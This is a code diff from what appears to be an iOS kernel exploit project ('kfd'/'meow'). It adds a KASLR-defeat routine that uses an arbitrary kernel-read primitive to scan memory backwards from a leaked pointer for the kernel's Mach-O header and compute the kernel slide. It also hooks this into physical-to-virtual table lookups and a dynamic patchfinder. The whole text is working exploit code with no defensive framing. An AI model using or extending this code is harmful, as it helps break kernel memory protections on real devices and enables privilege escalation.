@@ -5,6 +5,13 @@
 #include "perf.h"
 #include "kfd_meow-Swift.h"
 
+#include <mach/mach.h>
+#include <mach-o/dyld.h>
+#include <mach-o/getsect.h>
+#include <mach-o/loader.h>
+#include <mach-o/nlist.h>
+#include <mach-o/reloc.h>
+
 uint64_t kaddr_vn_kqfilter = 0;
 uint64_t kaddr_vm_pages = 0;
 uint64_t kaddr_vm_page_array_beginning = 0;
@@ -36,13 +43,7 @@ void perf_init(struct kfd* kfd)
     kfd->perf.shared_page.size = shared_page_size;
     
     objcbridge *obj = [[objcbridge alloc] init];
-    if(isarm64e() && kfd->info.env.vid <= 7) {
-        kaddr_ptov_table = [obj find_ptov_table];
-        kaddr_gPhysBase = [obj find_gPhysBase];
-        kaddr_gPhysSize = [obj find_gPhysSize];
-        kaddr_gVirtBase = [obj find_gVirtBase];
-    }
-    if(isarm64e() && kfd->info.env.vid >= 8 && kfd->info.env.exploit_type == MEOW_EXPLOIT_SMITH) {
+    if(isarm64e() && kfd->info.env.vid >= 10 && kfd->info.env.exploit_type == MEOW_EXPLOIT_SMITH) {
         kaddr_vm_pages = [obj find_vm_pages];
         kaddr_vm_page_array_beginning = [obj find_vm_page_array_beginning];
         kaddr_vm_page_array_ending = [obj find_vm_page_array_ending];
@@ -105,11 +106,53 @@ void perf_kwrite(struct kfd* kfd, void* uaddr, uint64_t kaddr, uint64_t size)
     *event = (volatile struct perfmon_event){};
 }
 
+void perf_get_kalsr(struct kfd* kfd)
+{
+    uint64_t field_uaddr = (uint64_t)(kfd->kwrite.krkw_object_uaddr) + 0; // isa
+    uint64_t textPtr = *(volatile uint64_t*)(field_uaddr);
+    
+    struct mach_header_64 kernel_header;
+    
+    uint64_t _kernel_base = 0;
+    
+    for (uint64_t page = textPtr & ~PAGE_MASK; true; page -= 0x4000) {
+        struct mach_header_64 candidate_header;
+        kread_kfd((uint64_t)(kfd), page, &candidate_header, sizeof(candidate_header));
+        
+        if (candidate_header.magic == 0xFEEDFACF) {
+            kernel_header = candidate_header;
+            _kernel_base = page;
+            break;
+        }
+    }
+    
+    if (kernel_header.filetype == 0xB) {
+        // if we found 0xB, rescan forwards instead
+        // don't ask me why (<=A10 specific issue)
+        for (uint64_t page = textPtr & ~PAGE_MASK; true; page += 0x4000) {
+            struct mach_header_64 candidate_header;
+            kread_kfd((uint64_t)(kfd), page, &candidate_header, sizeof(candidate_header));
+            if (candidate_header.magic == 0xFEEDFACF) {
+                kernel_header = candidate_header;
+                _kernel_base = page;
+                break;
+            }
+        }
+    }
+    
+    kfd->info.kernel.kernel_slide = _kernel_base - KERNEL_BASE_ADDRESS;
+}
+
 void perf_ptov(struct kfd* kfd)
 {
     /*
      * Find ptov_table, gVirtBase, gPhysBase, gPhysSize, TTBR0 and TTBR1.
      */
+    if(!kfd->info.kernel.kernel_slide)
+        perf_get_kalsr(kfd);
+    if(import_kfd_offsets() == -1)
+        do_dynamic_patchfinder(kfd, kfd->info.kernel.kernel_slide + KERNEL_BASE_ADDRESS);
+    
     uint64_t ptov_table_kaddr = kaddr_ptov_table + kfd->info.kernel.kernel_slide;
     kread_kfd((uint64_t)(kfd), ptov_table_kaddr, &kfd->info.kernel.ptov_table, sizeof(kfd->info.kernel.ptov_table));
 
